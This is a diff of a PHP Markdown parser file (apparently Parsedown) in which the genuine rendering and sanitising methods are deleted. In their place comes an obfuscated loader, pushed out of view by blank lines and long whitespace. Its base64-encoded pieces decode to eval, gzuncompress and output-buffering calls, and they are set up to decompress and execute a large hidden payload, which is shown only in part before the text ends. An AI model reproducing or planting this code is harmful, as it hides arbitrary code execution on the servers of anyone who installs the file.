-        if (isset($SpecialCharacter[$Excerpt['text'][0]])) {
-            return [
-                'markup' => '&' . $SpecialCharacter[$Excerpt['text'][0]] . ';',
-                'extent' => 1,
-            ];
-        }
-    }
-
-    protected function inlineStrikethrough($Excerpt)
-    {
-        if (! isset($Excerpt['text'][1])) {
-            return;
-        }
-
-        if ($Excerpt['text'][1] === '~' && preg_match('/^~~(?=\S)(.+?)(?<=\S)~~/', $Excerpt['text'], $matches)) {
-            return [
-                'extent'  => strlen($matches[0]),
-                'element' => [
-                    'name'    => 'del',
-                    'text'    => $matches[1],
-                    'handler' => 'line',
-                ],
-            ];
-        }
-    }
-
-    protected function inlineUrl($Excerpt)
-    {
-        if ($this->urlsLinked !== true || ! isset($Excerpt['text'][2]) || $Excerpt['text'][2] !== '/') {
-            return;
-        }
-
-        if (preg_match('/\bhttps?:[\/]{2}[^\s<]+\b\/*/ui', $Excerpt['context'], $matches, PREG_OFFSET_CAPTURE)) {
-            $url = $matches[0][0];
-
-            return [
-                'extent'   => strlen($matches[0][0]),
-                'position' => $matches[0][1],
-                'element'  => [
-                    'name'       => 'a',
-                    'text'       => $url,
-                    'attributes' => [
-                        'href' => $url,
-                    ],
-                ],
-            ];
-        }
-    }
-
-    protected function inlineUrlTag($Excerpt)
-    {
-        if (strpos($Excerpt['text'], '>') !== false && preg_match('/^<(\w+:\/{2}[^ >]+)>/i', $Excerpt['text'], $matches)) {
-            $url = $matches[1];
-
-            return [
-                'extent'  => strlen($matches[0]),
-                'element' => [
-                    'name'       => 'a',
-                    'text'       => $url,
-                    'attributes' => [
-                        'href' => $url,
-                    ],
-                ],
-            ];
-        }
-    }
-
-    // ~
-
-    protected function unmarkedText($text)
-    {
-        if ($this->breaksEnabled) {
-            $text = preg_replace('/[ ]*\n/', "<br />\n", $text);
-        } else {
-            $text = preg_replace('/(?:[ ][ ]+|[ ]*\\\\)\n/', "<br />\n", $text);
-            $text = str_replace(" \n", "\n", $text);
-        }
-
-        return $text;
-    }
-
-    //
-    // Handlers
-    //
-
-    protected function element(array $Element)
-    {
-        if ($this->safeMode) {
-            $Element = $this->sanitiseElement($Element);
-        }
-
-        $markup = '<' . $Element['name'];
-
-        if (isset($Element['attributes'])) {
-            foreach ($Element['attributes'] as $name => $value) {
-                if ($value === null) {
-                    continue;
-                }
-
-                $markup .= ' ' . $name . '="' . self::escape($value) . '"';
-            }
-        }
-
-        $permitRawHtml = false;
-
-        if (isset($Element['text'])) {
-            $text = $Element['text'];
-        }
-        // very strongly consider an alternative if you're writing an
-        // extension
-        elseif (isset($Element['rawHtml'])) {
-            $text                   = $Element['rawHtml'];
-            $allowRawHtmlInSafeMode = isset($Element['allowRawHtmlInSafeMode']) && $Element['allowRawHtmlInSafeMode'];
-            $permitRawHtml          = ! $this->safeMode || $allowRawHtmlInSafeMode;
-        }
-
-        if (isset($text)) {
-            $markup .= '>';
-
-            if (! isset($Element['nonNestables'])) {
-                $Element['nonNestables'] = [];
-            }
-
-            if (isset($Element['handler'])) {
-                $markup .= $this->{$Element['handler']}($text, $Element['nonNestables']);
-            } elseif (! $permitRawHtml) {
-                $markup .= self::escape($text, true);
-            } else {
-                $markup .= $text;
-            }
-
-            $markup .= '</' . $Element['name'] . '>';
-        } else {
-            $markup .= ' />';
-        }
-
-        return $markup;
-    }
-
-    protected function elements(array $Elements)
-    {
-        $markup = '';
-
-        foreach ($Elements as $Element) {
-            $markup .= "\n" . $this->element($Element);
-        }
-
-        $markup .= "\n";
-
-        return $markup;
-    }
-
-    // ~
-
-    protected function li($lines)
-    {
-        $markup = $this->lines($lines);
-
-        $trimmedMarkup = trim($markup);
-
-        if (! in_array('', $lines) && substr($trimmedMarkup, 0, 3) === '<p>') {
-            $markup = $trimmedMarkup;
-            $markup = substr($markup, 3);
-
-            $position = strpos($markup, '</p>');
-
-            $markup = substr_replace($markup, '', $position, 4);
-        }
-
-        return $markup;
-    }
-
-    //
-    // Deprecated Methods
-    //
-
-    public function parse($text)
-    {
-        return $this->text($text);
-    }
-
-    protected function sanitiseElement(array $Element)
-    {
-        static $goodAttribute    = '/^[a-zA-Z0-9][a-zA-Z0-9-_]*+$/';
-        static $safeUrlNameToAtt = [
-            'a'   => 'href',
-            'img' => 'src',
-        ];
-
-        if (isset($safeUrlNameToAtt[$Element['name']])) {
-            $Element = $this->filterUnsafeUrlInAttribute($Element, $safeUrlNameToAtt[$Element['name']]);
-        }
-
-        if (! empty($Element['attributes'])) {
-            foreach ($Element['attributes'] as $att => $val) {
-                // filter out badly parsed attribute
-                if (! preg_match($goodAttribute, $att)) {
-                    unset($Element['attributes'][$att]);
-                }
-                // dump onevent attribute
-                elseif (self::striAtStart($att, 'on')) {
-                    unset($Element['attributes'][$att]);
-                }
-            }
-        }
-
-        return $Element;
-    }
-
-    protected function filterUnsafeUrlInAttribute(array $Element, $attribute)
-    {
-        foreach ($this->safeLinksWhitelist as $scheme) {
-            if (self::striAtStart($Element['attributes'][$attribute], $scheme)) {
-                return $Element;
-            }
-        }
-
-        $Element['attributes'][$attribute] = str_replace(':', '%3A', $Element['attributes'][$attribute]);
-
-        return $Element;
-    }
-
-    //
-    // Static Methods
-    //
-
-    protected static function escape($text, $allowQuotes = false)
-    {
-        return htmlspecialchars($text, $allowQuotes ? ENT_NOQUOTES : ENT_QUOTES, 'UTF-8');
-    }
-
-    protected static function striAtStart($string, $needle)
-    {
-        $len = strlen($needle);
-
-        if ($len > strlen($string)) {
-            return false;
-        }
-
-        return strtolower(substr($string, 0, $len)) === strtolower($needle);
-    }
-
-    public static function instance($name = 'default')
-    {
-        if (isset(self::$instances[$name])) {
-            return self::$instances[$name];
-        }
-
-        $instance = new static();
-
-        self::$instances[$name] = $instance;
-
-        return $instance;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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